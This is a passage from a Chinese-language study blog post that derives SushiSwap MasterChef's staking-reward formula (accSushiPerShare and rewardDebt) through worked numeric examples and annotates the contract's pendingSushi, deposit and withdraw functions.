<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">From</span> block <span class="number">0</span> to <span class="number">10</span>:</span><br><span class="line"><span class="title class_">BlocksPassed</span>: <span class="number">10</span></span><br><span class="line"><span class="title class_">BlockRewards</span> = <span class="title class_">BlocksPassed</span> * <span class="title class_">RewardsPerBlock</span> </span><br><span class="line"><span class="title class_">BlockRewards</span> = $<span class="number">10</span></span><br><span class="line"><span class="title class_">StakerATokens</span>: $<span class="number">100</span></span><br><span class="line"><span class="title class_">TotalTokens</span>: $<span class="number">100</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">StakerAShare</span> = <span class="title class_">StakerATokens</span> / <span class="title class_">TotalTokens</span></span><br><span class="line"><span class="title class_">StakerAShare</span> = <span class="number">1</span></span><br><span class="line"><span class="title class_">StakerAAccumulatedRewards</span> = <span class="title class_">BlockRewards</span> * <span class="title class_">StakerAShare</span></span><br><span class="line"><span class="title class_">StakerAAccumulatedRewards</span> = $<span class="number">10</span></span><br></pre></td></tr></table></figure>
<p>10个区块后，用户B质押$100<br />
在第15个区块时，用户A提取所有收益</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">From</span> <span class="title class_">Block</span> <span class="number">10</span> to <span class="number">15</span>:</span><br><span class="line"><span class="title class_">BlocksPassed</span>: <span class="number">5</span></span><br><span class="line"><span class="title class_">BlockRewards</span> = <span class="title class_">BlocksPassed</span> * <span class="title class_">RewardsPerBlock</span> </span><br><span class="line"><span class="title class_">BlockRewards</span> = $<span class="number">5</span></span><br><span class="line"><span class="title class_">StakerATokens</span>: $<span class="number">100</span></span><br><span class="line"><span class="title class_">StakerBTokens</span>: $<span class="number">100</span></span><br><span class="line"><span class="title class_">TotalTokens</span>: $<span class="number">200</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">StakerAShare</span> = <span class="title class_">StakerATokens</span> / <span class="title class_">TotalTokens</span></span><br><span class="line"><span class="title class_">StakerAShare</span> = <span class="number">1</span>/<span class="number">2</span></span><br><span class="line"><span class="title class_">StakerAAccumulatedRewards</span> = (<span class="title class_">BlockRewards</span> * <span class="title class_">StakerAShare</span>) + <span class="title class_">StakerAAccumulatedRewards</span></span><br><span class="line"><span class="title class_">StakerAAccumulatedRewards</span> = $<span class="number">2.5</span> + $<span class="number">10</span> = $<span class="number">12.5</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">StakerBShare</span> = <span class="title class_">StakerBTokens</span> / <span class="title class_">TotalTokens</span></span><br><span class="line"><span class="title class_">StakerBShare</span> = <span class="number">1</span>/<span class="number">2</span></span><br><span class="line"><span class="title class_">StakerBAccumulatedRewards</span> = <span class="title class_">BlockRewards</span> * <span class="title class_">StakerBShare</span></span><br><span class="line"><span class="title class_">StakerBAccumulatedRewards</span> = $<span class="number">2.5</span></span><br></pre></td></tr></table></figure>
<p>用户A提取收益后,<code>StakerAAccumulatedRewards</code>重置为 0。用户B在区块10~15累积奖励为 $2.5</p>
<p>在第25区块时，用户B也提取所有收益</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">From</span> <span class="title class_">Block</span> <span class="number">15</span> to <span class="number">25</span>:</span><br><span class="line"><span class="title class_">BlocksPassed</span>: <span class="number">10</span></span><br><span class="line"><span class="title class_">BlockRewards</span>: $<span class="number">10</span></span><br><span class="line"><span class="title class_">StakerATokens</span>: $<span class="number">100</span></span><br><span class="line"><span class="title class_">StakerBTokens</span>: $<span class="number">100</span></span><br><span class="line"><span class="title class_">TotalTokens</span>: $<span class="number">200</span></span><br><span class="line"><span class="title class_">StakerAAccumulatedRewards</span>: $<span class="number">5</span></span><br><span class="line"><span class="title class_">StakerBAccumulatedRewards</span>: $<span class="number">2.5</span> + $<span class="number">5</span> = $<span class="number">7.5</span></span><br></pre></td></tr></table></figure>
<p>用户B提取收益后，<code>StakerBAccumulatedRewards</code>重置为 0。最后，两个用户在第30区块后，同时提取奖励</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">From</span> <span class="title class_">Block</span> <span class="number">25</span> to <span class="number">30</span>:</span><br><span class="line"><span class="title class_">BlocksPassed</span>: <span class="number">5</span></span><br><span class="line"><span class="title class_">BlockRewards</span>: $<span class="number">5</span></span><br><span class="line"><span class="title class_">StakerATokens</span>: $<span class="number">100</span></span><br><span class="line"><span class="title class_">StakerBTokens</span>: $<span class="number">100</span></span><br><span class="line"><span class="title class_">TotalTokens</span>: $<span class="number">200</span></span><br><span class="line"><span class="title class_">StakerAAccumulatedRewards</span>: $<span class="number">5</span> + $<span class="number">2.5</span> = $<span class="number">7.5</span></span><br><span class="line"><span class="title class_">StakerBAccumulatedRewards</span>: $<span class="number">2.5</span></span><br></pre></td></tr></table></figure>
<p>30个区块共产生奖励 $30<br />
用户A、B总收益分别为：</p>
<ul class="lvl-0">
<li class="lvl-2">
<p>12.5 + 7.5 = $20</p>
</li>
<li class="lvl-2">
<p>7.5 + 2.5 = $10</p>
</li>
</ul>
<p>这就引申出了个一般的计算思路：每当有交易触发(用户质押/提取本金)，都会导致池子里每个用户的比例发生变化，我们要遍历所有用户并更新他们的累加奖励。但这样频繁操作<code>World State Variable</code>/<code>Storage Variable</code>了，要想办法尽量减少操作次数。</p>
<blockquote>
<p>这应该是空间复杂度的问题了</p>
</blockquote>
<h1>应用数学计算-&gt;简化:</h1>
<p>用户A的最终质押收益 = 每组区块质押奖励之和</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerARewards</span> = </span><br><span class="line"><span class="title class_">StakerA0</span>to10Rewards + </span><br><span class="line"><span class="title class_">StakerA10</span>to15Rewards + </span><br><span class="line"><span class="title class_">StakerA15</span>to25Rewards + </span><br><span class="line"><span class="title class_">StakerA25</span>to30Rewards</span><br></pre></td></tr></table></figure>
<p>用户A区块(N~M)的质押收益 = 区块(N~M)总奖励 * 区块(N~M)用户A的份额比例</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerANtoMRewards</span> = <span class="title class_">BlockRewardsOnNtoM</span> * <span class="title class_">StakerAShareOnNtoM</span></span><br></pre></td></tr></table></figure>
<p>区块(N~M)用户A的份额比例 = 区块(N~M)A质押代币数 / 区块(N~M)总质押代币数</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerAShareOnNtoM</span> = <span class="title class_">StakerATokensOnNtoM</span> / <span class="title class_">TotalTokensOnNtoM</span></span><br></pre></td></tr></table></figure>
<p>公式汇总一下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerARewards</span> = </span><br><span class="line">区块(N~M)总奖励 * 区块(N~M)A质押代币数 / 区块(N~M)总质押代币数</span><br><span class="line">(<span class="title class_">BlockRewardsOn0</span>to10 * <span class="title class_">StakerATokensOn0</span>to10 / <span class="title class_">TotalTokensOn0</span>to10) + </span><br><span class="line">(<span class="title class_">BlockRewardsOn10</span>to15 * <span class="title class_">StakerATokensOn10</span>to15 / <span class="title class_">TotalTokensOn10</span>to15) + </span><br><span class="line">(<span class="title class_">BlockRewardsOn15</span>to25 * <span class="title class_">StakerATokensOn15</span>to25 / <span class="title class_">TotalTokensOn15</span>to25) + </span><br><span class="line">(<span class="title class_">BlockRewardsOn25</span>to30 * <span class="title class_">StakerATokensOn25</span>to30 / <span class="title class_">TotalTokensOn25</span>to30)</span><br></pre></td></tr></table></figure>
<p>用户A每组区块的质押代币数都是一样的，本金没取过</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerATokensOn0</span>to10 = </span><br><span class="line"><span class="title class_">StakerATokensOn10</span>to15 = </span><br><span class="line"><span class="title class_">StakerATokensOn15</span>to25 = </span><br><span class="line"><span class="title class_">StakerATokensOn25</span>to30 = </span><br><span class="line"><span class="title class_">StakerATokens</span></span><br></pre></td></tr></table></figure>
<p>简化我们的<code>StakerARewards</code>公式:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerARewards</span> = <span class="title class_">StakerATokens</span> * (</span><br><span class="line">  (<span class="title class_">BlockRewardsOn0</span>to10 / <span class="title class_">TotalTokensOn0</span>to10) + </span><br><span class="line">  (<span class="title class_">BlockRewardsOn10</span>to15 / <span class="title class_">TotalTokensOn10</span>to15) + </span><br><span class="line">  (<span class="title class_">BlockRewardsOn15</span>to25 / <span class="title class_">TotalTokensOn15</span>to25) + </span><br><span class="line">  (<span class="title class_">BlockRewardsOn25</span>to30 / <span class="title class_">TotalTokensOn25</span>to30)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>代入实际数字验证一下该公式:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerARewards</span> = <span class="number">100</span> * (</span><br><span class="line">  (<span class="number">10</span> / <span class="number">100</span>) + </span><br><span class="line">  (<span class="number">5</span>  / <span class="number">200</span>) + </span><br><span class="line">  (<span class="number">10</span> / <span class="number">200</span>) + </span><br><span class="line">  (<span class="number">5</span>  / <span class="number">200</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerARewards</span> = <span class="number">100</span> * ( <span class="number">0.1</span> + <span class="number">0.025</span> + <span class="number">0.05</span> + <span class="number">0.025</span>) = <span class="number">100</span> * <span class="number">0.2</span> = <span class="number">20</span></span><br></pre></td></tr></table></figure>
<p>与模拟的情况是一样的,对用户B也计算一下:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerBRewards</span> = <span class="number">100</span> * (</span><br><span class="line">  (<span class="number">5</span>  / <span class="number">200</span>) + </span><br><span class="line">  (<span class="number">10</span> / <span class="number">200</span>) + </span><br><span class="line">  (<span class="number">5</span>  / <span class="number">200</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerBRewards</span> = <span class="number">100</span> * (<span class="number">0.025</span> + <span class="number">0.05</span> + <span class="number">0.025</span>) = <span class="number">10</span></span><br></pre></td></tr></table></figure>
<p>两个用户都验证正确，然后在计算奖励时，他们有共同的除法总和：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="number">5</span>  / <span class="number">200</span>) + (<span class="number">10</span> / <span class="number">200</span>) + (<span class="number">5</span>  / <span class="number">200</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220715231308.png" alt="20220715231308" /></p>
<p><code>SushiSwap</code> 称这个除法总和为<code>accSushiPerShare</code></p>
<p>每一部分，我们定义为<code>RewardsPerShare</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">区块区间奖励 / 区块区间总质押数 = 区块区间 每个质押<span class="title class_">Token</span>可以奖励多少</span><br><span class="line"><span class="title class_">RewardsPerShareOn0</span>to10  = (<span class="number">10</span> / <span class="number">100</span>)   </span><br><span class="line"><span class="title class_">RewardsPerShareOn10</span>to15 = (<span class="number">5</span>  / <span class="number">500</span>)</span><br><span class="line"><span class="title class_">RewardsPerShareOn15</span>to25 = (<span class="number">10</span> / <span class="number">500</span>)</span><br><span class="line"><span class="title class_">RewardsPerShareOn25</span>to30 = (<span class="number">5</span>  / <span class="number">500</span>)</span><br></pre></td></tr></table></figure>
<p>累加起来定义为<code>AccumulatedRewardsPerShare</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">AccumulatedRewardsPerShare</span> = </span><br><span class="line"><span class="title class_">RewardsPerShareOn0</span>to10 + </span><br><span class="line"><span class="title class_">RewardsPerShareOn10</span>to15 + </span><br><span class="line"><span class="title class_">RewardsPerShareOn15</span>to25 + </span><br><span class="line"><span class="title class_">RewardsPerShareOn25</span>to30</span><br></pre></td></tr></table></figure>
<p>用户A奖励 = 质押代币数 * 累加的 每个token的奖励数量</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerARewards</span> = <span class="title class_">StakerATokens</span> * <span class="title class_">AccumulatedRewardsPerShare</span></span><br></pre></td></tr></table></figure>
<p>由于<code>AccumulatedRewardsPerShare</code>对所有用户来说都是一样的，对于用户来说，<code>StakerBRewards</code>获得的奖励的数量需要减去用户B在区块0~10获得的奖励</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerBRewards</span> = <span class="title class_">StakerBTokens</span> * (<span class="title class_">AccumulatedRewardsPerShare</span> - <span class="title class_">RewardsPerShareOn0</span>to10)</span><br></pre></td></tr></table></figure>
<p>我们可以将<code>AccumulatedRewardsPerShare</code>用于每个质押者的奖励计算，我们也必须减去<code>RewardsPerShare</code>他们的存款/取款操作之前产生的奖励。</p>
<blockquote>
<p>Key Point~</p>
</blockquote>
<p><code>StakerARewards</code> 使用上面刚刚使用的公式得到相同的值</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerARewards</span> = <span class="title class_">StakerARewardsOn0</span>to15 + <span class="title class_">StakerARewardsOn15</span>to30</span><br><span class="line"><span class="title class_">StakerARewards</span> = <span class="title class_">StakerATokens</span> * <span class="title class_">AccumulatedRewardsPerShare</span></span><br></pre></td></tr></table></figure>
<p>调换一下位置，变化一下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerARewardsOn15</span>to30 = <span class="title class_">StakerARewards</span> - <span class="title class_">StakerARewardsOn0</span>to15</span><br><span class="line"><span class="title class_">StakerARewards</span> = <span class="title class_">StakerATokens</span> * <span class="title class_">AccumulatedRewardsPerShare</span></span><br></pre></td></tr></table></figure>
<p>可以得到</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerARewardsOn15</span>to30 = <span class="title class_">StakerATokens</span> * </span><br><span class="line"><span class="title class_">AccumulatedRewardsPerShare</span> - <span class="title class_">StakerARewardsOn0</span>to15</span><br><span class="line"><span class="comment">// 记住 AccumulatedRewardsPerShare 是全阶段的</span></span><br></pre></td></tr></table></figure>
<p>对块 0 到 15 使用以下公式:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerARewardsOn0</span>to15 = <span class="title class_">StakerATokens</span> * </span><br><span class="line"><span class="title class_">AccumulatedRewardsPerShareOn0</span>to15</span><br></pre></td></tr></table></figure>
<p>并替换上一个公式中的<code>StakerARewardsOn0to15</code></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerARewardsOn15</span>to30 = </span><br><span class="line"><span class="title class_">StakerATokens</span> * <span class="title class_">AccumulatedRewardsPerShare</span> -</span><br><span class="line"><span class="title class_">StakerATokens</span> * <span class="title class_">AccumulatedRewardsPerShareOn0</span>to15</span><br></pre></td></tr></table></figure>
<p>提取公因子<code>StakerATokens</code>:</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerARewardsOn15</span>to30 = <span class="title class_">StakerATokens</span> * </span><br><span class="line">(<span class="title class_">AccumulatedRewardsPerShare</span> - <span class="title class_">AccumulatedRewardsPerShareOn0</span>to15)</span><br></pre></td></tr></table></figure>
<p>这与我们之前得到的公式<code>StakerBRewards</code>非常相似</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerBRewards</span> = <span class="title class_">StakerBTokens</span> * </span><br><span class="line">(<span class="title class_">AccumulatedRewardsPerShare</span> - <span class="title class_">RewardsPerShareOn0</span>to10)</span><br></pre></td></tr></table></figure>
<p>代入数据验证一下：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">StakerATokens</span> = <span class="number">100</span></span><br><span class="line"><span class="title class_">AccumulatedRewardsPerShare</span> = (<span class="number">10</span> / <span class="number">100</span>) + (<span class="number">5</span> / <span class="number">200</span>) + (<span class="number">10</span> / <span class="number">200</span>) + (<span class="number">5</span> / <span class="number">200</span>)</span><br><span class="line"><span class="title class_">AccumulatedRewardsPerShareOn0</span>to15 = (<span class="number">10</span> / <span class="number">100</span>) + (<span class="number">5</span> / <span class="number">200</span>)</span><br><span class="line"></span><br><span class="line"><span class="title class_">StakerARewardsOn15</span>to30 = <span class="title class_">StakerATokens</span> * (<span class="title class_">AccumulatedRewardsPerShare</span> - <span class="title class_">AccumulatedRewardsPerShareOn0</span>to15)</span><br><span class="line"><span class="title class_">StakerARewardsOn15</span>to30 = <span class="number">100</span> * ((<span class="number">10</span> / <span class="number">200</span>) + (<span class="number">5</span> / <span class="number">200</span>)) = <span class="number">100</span> * (<span class="number">0.05</span> + <span class="number">0.025</span>) = <span class="number">7.5</span></span><br><span class="line"><span class="title class_">StakerARewardsOn15</span>to30 = <span class="number">7.5</span></span><br></pre></td></tr></table></figure>
<p>验证正确，这意味着，如果我们在每次存款或取款时，保存一下<code>BlockNtoMRewardsPerShare</code>，累加成<code>AccumulatedRewardsPerShare</code>.<br />
再减去之前没参加的区块奖励。</p>
<p>这就是MasterChef里的<code>rewardDebt</code>(奖励欠款)的含义。这就像计算一个质押者自第0块以来的总奖励，但删除他们已经获得的奖励或他们没有资格获得的奖励，因为他们还没有质押。</p>
<h1>gas比较：</h1>
<p>我们一开始的思路是 Pool里总质押量发生变化时，要遍历所有用户并更新他们的累加奖励。现在的思路是：总质押量变化时，仅更新<code>AccumulatedRewardsPerShare</code></p>
<p>引用<a href="https://dev.to/heymarkkop/understanding-sushiswaps-masterchef-staking-rewards-1m6f">文章</a>里的.<br />
使用<code>hardhat-gas-reporter</code>，我们可以看到每个实现的成本是多少。</p>
<p>对于第一个思路（遍历所有质押者）:</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220716102735.png" alt="20220716102735" /></p>
<p>对于第二个思路（使用 AccumulatedRewardsPerShare）：</p>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220716102822.png" alt="20220716102822" /></p>
<p><strong>即使只有两个质押者，这也节省了 20% 的gas。</strong></p>
<p>经过以上的推导过程后，再来看看源码.</p>
<h1>pendingSushi计算待奖励函数:</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// View function to see pending SUSHIs on frontend.</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">pendingSushi</span>(<span class="params">uint256 _pid, address _user</span>)</span><br><span class="line">    external</span><br><span class="line">    view</span><br><span class="line">    returns (uint256)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="title class_">PoolInfo</span> storage pool = poolInfo[_pid]; <span class="comment">// 池子信息</span></span><br><span class="line">    <span class="title class_">UserInfo</span> storage user = userInfo[_pid][_user]; <span class="comment">// 用户信息</span></span><br><span class="line">    uint256 accSushiPerShare = pool.<span class="property">accSushiPerShare</span>; <span class="comment">// 区块区间奖励 / 区块区间总质押数 = 区块区间 每个质押Token可以奖励多少 = SushiPerShare</span></span><br><span class="line">                                                      <span class="comment">// accSushiPerShare = SushiPerShare累加之和</span></span><br><span class="line">    uint256 lpSupply = pool.<span class="property">lpToken</span>.<span class="title function_">balanceOf</span>(<span class="title function_">address</span>(<span class="variable language_">this</span>));</span><br><span class="line">    <span class="keyword">if</span> (block.<span class="property">number</span> &gt; pool.<span class="property">lastRewardBlock</span> &amp;&amp; lpSupply != <span class="number">0</span>) &#123;</span><br><span class="line">        uint256 multiplier =</span><br><span class="line">            <span class="title function_">getMultiplier</span>(pool.<span class="property">lastRewardBlock</span>, block.<span class="property">number</span>);</span><br><span class="line">        uint256 sushiReward =</span><br><span class="line">            multiplier.<span class="title function_">mul</span>(sushiPerBlock).<span class="title function_">mul</span>(pool.<span class="property">allocPoint</span>).<span class="title function_">div</span>(  <span class="comment">// allocPoint是质押池的分配比例</span></span><br><span class="line">                totalAllocPoint</span><br><span class="line">            );</span><br><span class="line">        accSushiPerShare = accSushiPerShare.<span class="title function_">add</span>(    <span class="comment">// SushiPerShare累加</span></span><br><span class="line">            sushiReward.<span class="title function_">mul</span>(<span class="number">1e12</span>).<span class="title function_">div</span>(lpSupply) <span class="comment">// 由于accSushiPerShare可以是带小数的数字，</span></span><br><span class="line">            <span class="comment">// 而 Solidity 不处理浮点数，因此它们在计算时乘以sushiReward一个大数字1e12，然后在使用时除以相同的数字。</span></span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> user.<span class="property">amount</span>.<span class="title function_">mul</span>(accSushiPerShare).<span class="title function_">div</span>(<span class="number">1e12</span>).<span class="title function_">sub</span>(user.<span class="property">rewardDebt</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>SushiPerShare</code>: 区块区间奖励 / 区块区间总质押数 = 区块区间 每个质押Token可以奖励多少 = SushiPerShare</p>
</li>
<li class="lvl-2">
<p><code>accSushiPerShare</code>:SushiPerShare累加之和，注意是从开始奖励区块 就一直累加的</p>
</li>
<li class="lvl-2">
<p><code>rewardDebt</code>奖励债务</p>
</li>
</ul>
<h1>deposit质押本金函数：</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Deposit LP tokens to MasterChef for SUSHI allocation.</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">deposit</span>(<span class="params">uint256 _pid, uint256 _amount</span>) public &#123; <span class="comment">// 质押本金</span></span><br><span class="line">    <span class="title class_">PoolInfo</span> storage pool = poolInfo[_pid];</span><br><span class="line">    <span class="title class_">UserInfo</span> storage user = userInfo[_pid][msg.<span class="property">sender</span>];</span><br><span class="line">    <span class="title function_">updatePool</span>(_pid); <span class="comment">// 更新池子</span></span><br><span class="line">    <span class="keyword">if</span> (user.<span class="property">amount</span> &gt; <span class="number">0</span>) &#123; <span class="comment">// 该用户之前有质押过</span></span><br><span class="line">        uint256 pending = <span class="comment">// 累积奖励</span></span><br><span class="line">            user.<span class="property">amount</span>.<span class="title function_">mul</span>(pool.<span class="property">accSushiPerShare</span>).<span class="title function_">div</span>(<span class="number">1e12</span>).<span class="title function_">sub</span>(</span><br><span class="line">                user.<span class="property">rewardDebt</span></span><br><span class="line">            );</span><br><span class="line">        <span class="title function_">safeSushiTransfer</span>(msg.<span class="property">sender</span>, pending); <span class="comment">// 发放之前的奖励</span></span><br><span class="line">    &#125;</span><br><span class="line">    pool.<span class="property">lpToken</span>.<span class="title function_">safeTransferFrom</span>(</span><br><span class="line">        <span class="title function_">address</span>(msg.<span class="property">sender</span>),</span><br><span class="line">        <span class="title function_">address</span>(<span class="variable language_">this</span>),</span><br><span class="line">        _amount</span><br><span class="line">    );</span><br><span class="line">    user.<span class="property">amount</span> = user.<span class="property">amount</span>.<span class="title function_">add</span>(_amount); <span class="comment">// 记录本金增加</span></span><br><span class="line">    user.<span class="property">rewardDebt</span> = user.<span class="property">amount</span>.<span class="title function_">mul</span>(pool.<span class="property">accSushiPerShare</span>).<span class="title function_">div</span>(<span class="number">1e12</span>); <span class="comment">// !!! 记录奖励欠款</span></span><br><span class="line">    emit <span class="title class_">Deposit</span>(msg.<span class="property">sender</span>, _pid, _amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>withdraw提取本金函数：</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// Withdraw LP tokens from MasterChef.</span></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">withdraw</span>(<span class="params">uint256 _pid, uint256 _amount</span>) public &#123; <span class="comment">// 提取一定数量的本金</span></span><br><span class="line">    <span class="title class_">PoolInfo</span> storage pool = poolInfo[_pid];</span><br><span class="line">    <span class="title class_">UserInfo</span> storage user = userInfo[_pid][msg.<span class="property">sender</span>];</span><br><span class="line">    <span class="built_in">require</span>(user.<span class="property">amount</span> &gt;= _amount, <span class="string">&quot;withdraw: not good&quot;</span>);</span><br><span class="line">    <span class="title function_">updatePool</span>(_pid); <span class="comment">// 更新池子</span></span><br><span class="line">    uint256 pending =</span><br><span class="line">        user.<span class="property">amount</span>.<span class="title function_">mul</span>(pool.<span class="property">accSushiPerShare</span>).<span class="title function_">div</span>(<span class="number">1e12</span>).<span class="title function_">sub</span>(</span><br><span class="line">            user.<span class="property">rewardDebt</span></span><br><span class="line">        );</span><br><span class="line">    <span class="title function_">safeSushiTransfer</span>(msg.<span class="property">sender</span>, pending);</span><br><span class="line">    user.<span class="property">amount</span> = user.<span class="property">amount</span>.<span class="title function_">sub</span>(_amount);</span><br><span class="line">    user.<span class="property">rewardDebt</span> = user.<span class="property">amount</span>.<span class="title function_">mul</span>(pool.<span class="property">accSushiPerShare</span>).<span class="title function_">div</span>(<span class="number">1e12</span>);</span><br><span class="line">    pool.<span class="property">lpToken</span>.<span class="title function_">safeTransfer</span>(<span class="title function_">address</span>(msg.<span class="property">sender</span>), _amount);</span><br><span class="line">    emit <span class="title class_">Withdraw</span>(msg.<span class="property">sender</span>, _pid, _amount);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1>奖励公式注释:</h1>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// We do some fancy math here. Basically, any point in time, the amount of SUSHIs</span></span><br><span class="line">      <span class="comment">// entitled to a user but is pending to be distributed is:</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">//   pending reward = (user.amount * pool.accSushiPerShare) - user.rewardDebt</span></span><br><span class="line">      <span class="comment">//</span></span><br><span class="line">      <span class="comment">// Whenever a user deposits or withdraws LP tokens to a pool. Here&#x27;s what happens:</span></span><br><span class="line">      <span class="comment">//   1. The pool&#x27;s `accSushiPerShare` (and `lastRewardBlock`) gets updated.</span></span><br><span class="line">      <span class="comment">//   2. User receives the pending reward sent to his/her address.</span></span><br><span class="line">      <span class="comment">//   3. User&#x27;s `amount` gets updated.</span></span><br><span class="line">      <span class="comment">//   4. User&#x27;s `rewardDebt` gets updated.</span></span><br></pre></td></tr></table></figure>
<p>待奖励数量 = (用户质押数量 * 累加的(每区块每个token可以奖励的数量)) - user.rewardDebt</p>
<ul class="lvl-0">
<li class="lvl-2">
<p><code>SushiPerShare</code>: 区块区间奖励 / 区块区间总质押数 = 区块区间 每个质押Token可以奖励多少Sushi = SushiPerShare 区间单位token奖励数量</p>
</li>
<li class="lvl-2">
<p><code>accSushiPerShare</code>:SushiPerShare累加之和，注意是从开始奖励区块 就一直累加的</p>
</li>
<li class="lvl-2">
<p><code>user.amount * pool.accSushiPerShare</code>: 假设了该用户从0/开始奖励区块就进入了, 至今的总奖励</p>
</li>
<li class="lvl-2">
<p><code>user.rewardDebt</code> 用户的奖励债务</p>
</li>
</ul>
<p>当有用户 质押/提取 本金，就会改变池子的比例，会立即更新：</p>
<ol>
<li class="lvl-3">
<p><code>accSushiPerShare</code>区间单位token奖励数量 累加值,<code>lastRewardBlock</code>上一个奖励区块</p>
</li>
<li class="lvl-3">
<p>用户会接受到 待提取的奖励</p>
</li>
<li class="lvl-3">
<p>用户的质押本金 更新</p>
</li>
<li class="lvl-3">
<p>用户的奖励债务 更新</p>
</li>
</ol>
<p><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220716115809.png" alt="20220716115809" /></p>
<h1>Summary:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p>自己推导一下数学公式，利于加深理解</p>
</li>
<li class="lvl-2">
<p>think step walk slowly</p>
</li>
<li class="lvl-2">
<p>有些池子前期每区块奖励的数量多，质押的本金少，这个时候大户进入，很有优势</p>
<ul class="lvl-2">
<li class="lvl-4">因为总奖励多，占比例大，收益就很高</li>
<li class="lvl-4">apr高，吸引新用户进来，买矿币，矿币价格↑，暂时没抛压</li>
<li class="lvl-4">矿币价格可能在上升期，挖提卖就很爽,双倍快乐 😋😋😋</li>
<li class="lvl-4">Be a Degen？？？</li>
<li class="lvl-4"><img src="https://raw.githubusercontent.com/jerrychan807/imggg/master/image/20220716120707.png" alt="20220716120707" /></li>
</ul>
</li>
</ul>
<h1>Refs:</h1>
<ul class="lvl-0">
<li class="lvl-2">
<p><a href="https://docs.sushi.com/docs/Developers/Sushiswap/MasterChef">MasterChef</a></p>
</li>
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/question/3231">关于开发一个模仿pancakeswap的质押挖矿功能</a></p>
</li>
<li class="lvl-2">
<p><a href="https://ethereum.stackexchange.com/questions/101662/how-to-calculate-apr-from-a-masterchef-contract-pool">How to Calculate APR From A Masterchef Contract Pool</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.liaoxuefeng.com/article/1459957270577186">流动性挖矿原理</a></p>
</li>
<li class="lvl-2">
<p><a href="https://learnblockchain.cn/article/2128">SUSHI的源码及方案解析一（流动性挖矿部分的解析与克隆）</a></p>
</li>
<li class="lvl-2">
<p><a href="https://blog.csdn.net/biakia0610/article/details/115662922">SushiSwap的MasterChef解读</a></p>
</li>
<li class="lvl-2">
<p><a href="https://dev.to/heymarkkop/understanding-sushiswaps-masterchef-staking-rewards-1m6f">Understanding SushiSwap’s MasterChef staking rewards</a></p>
</li>
<li class="lvl-2">
<p><a href="https://www.reddit.com/r/SushiSwap/comments/pvv6aa/please_help_me_understand_the_rewards_structure/">Please help me understand the rewards structure</a></p>
</li>
<li class="lvl-2">
<p><a href="https://soliditydeveloper.com/sushi-swap">SushiSwap Explained!</a></p>
</li>
</ul>
]]></content>
      <categories>
        <category>StudyRecord</category>
      </categories>
      <tags>
        <tag>StudyRecord</tag>
        <tag>SmartContract</tag>
      </tags>
  </entry>
  <entry>
    <title>StudyRecord-USDCV2_Upgrading_a_multi-billion_dollar_ERC-20token</title>
    <url>/2022/16620.html</url>
    <content><![CDATA[<h1>Pre:</h1>
